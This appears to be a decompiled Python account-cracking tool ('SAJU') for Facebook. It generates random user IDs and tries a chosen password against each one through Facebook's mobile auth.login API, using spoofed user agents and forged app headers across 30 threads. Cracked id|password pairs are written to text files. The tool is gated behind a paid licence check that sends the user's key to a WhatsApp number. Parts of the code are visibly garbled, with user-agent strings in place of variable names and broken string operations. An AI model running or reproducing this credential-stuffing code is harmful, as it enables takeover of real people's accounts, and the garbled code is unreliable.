        Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) = random.choice(['Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', '
        sys.stdout.write('\r [ SAJU ] %s/%s -> Ok:-%s - Cp:-%s ' % (self.loop, len(self.id), len(self.cp), len(self.ok)))
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': rua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            response = ses.get({'https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid)} + {'&password='} + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print('\r [0;92m[ SAJU-OK ] %s | %s[0;97m         ' % (uid, pw))
                print('\r [0;92m Congrats Bro ')
                self.ok.append('%s|%s' % (uid, pw))
                open('2009-SAJU -Ok.txt', 'a').write(' %s|%s\n' % (uid, pw))
                break
            if 'www.facebook.com' in response.json()['error_msg']:
                print('\r [0;92m[ SAJU-OK ] %s | %s[0;97m         ' % (uid, pw))
                self.cp.append('%s|%s' % (uid, pw))
                open('2009-SAJU-OK.txt', 'a').write(' %s | %s\n' % (uid, pw))
                break
        self.loop = 1

    def old2(self):
        x = 1111111111
        xx = 9999999999
        idx = '10000'
        os.system('clear')
        print(logo)
        limit = int(input('\n [0;95m[+][0;93m TOTAL IDS TO CRACK LIMIT 50,000: '))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print('[0;93m [+] TOTAL ID -> [0;91m%s[0;97m' + len(self.id))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print('\n[1;32m [!] USE (123456) FOR IDZ[1;37m ')
                listpass = input('%s [?] ENTER PASSWORD :%s ' % (G, Y))
                if len(listpass) <= 5:
                    exit('\n%s [!] PASSWORD MINIMUM 6 CHARACTERS' + B)
                print('%s [*] CRACK WITH PASSWORD -> [[0;91m%s[0;93m]' % (G, listpass))
                os.system('clear')
                print(logo)
                print('\n%s [+] OK RESULTS SAVED IN -> ok.txt' + Y)
                print('%s [+] CP RESULTS SAVED IN -> cp.txt' + G)
                print('%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS[0m\n' + P)
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(','))
                exit('\n\n [>>] CRACK COMPLETE...')
        except Exception as e:
                exit(str(e))

    def api(self, uid, pwx):
        Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) = random.choice(['Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', '
        sys.stdout.write('\r [ SAJU ] %s/%s -> Ok:-%s - Cp:-%s ' % (self.loop, len(self.id), len(self.cp), len(self.ok)))
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': rua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            response = ses.get({'https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid)} + {'&password='} + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print('\r [0;92m[ SAJU-OK ] %s | %s[0;97m         ' % (uid, pw))
                print('\r [0;92m Congrats Bro ')
                self.ok.append('%s|%s' % (uid, pw))
                open('2009-SAJU-Ok.txt', 'a').write(' %s|%s\n' % (uid, pw))
                break
            if 'www.facebook.com' in response.json()['error_msg']:
                print('\r [0;92m[ SAJU-OK ] %s | %s[0;97m         ' % (uid, pw))
                self.cp.append('%s|%s' % (uid, pw))
                open('2009-SAJU-OK.txt', 'a').write(' %s | %s\n' % (uid, pw))
                break
        self.loop = 1

def Subscraption():
    key1 = open('/data/data/com.termux/files/usr/bin/.mrSAJU -cov', 'r').read()
    clear()
    print(logo)
    r1 = requests.get('https://github.com/SAJUx/Saju/blob/main/approved.txt').text
    if key1 in r1:
        os.system('clear')
        print(logo)
        Main()
    else:  # inserted
        os.system('clear')
        print(logo)
        print('\t [1;32m First Get Approvel[1;37m ')
        time.sleep(1)
        os.system('clear')
        print(logo)
        print('')
        print(' [1;32m SAJU Toll PAID  You Need Get Approved First[1;37m\n')
        print(' [1;32m Note : SAJU PAID  [1;37m')
        print('')
        print(' Your Key is Not Approved ')
        print('')
        print(' Copy And Send Key To Admin')
        print('')
        print(' Your Key : ' % ak() * ah + key1)
        print('')
        name = input(' Your Name : ')
        print('')
        gf = input(' Your Pyment number : ')
        print('')
        lol = input(' Your Your Email : ')
        print('')
        input(' Press Enter To Send Key')
        time.sleep(3.5)
        tks = ['Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20' + lol] + ['%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'] * name + ['%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'] * ak + ah * key1
        os.system('am start https://wa.me/+8801406687036?text=' + tks)
        Subscraption()
Subscraption()
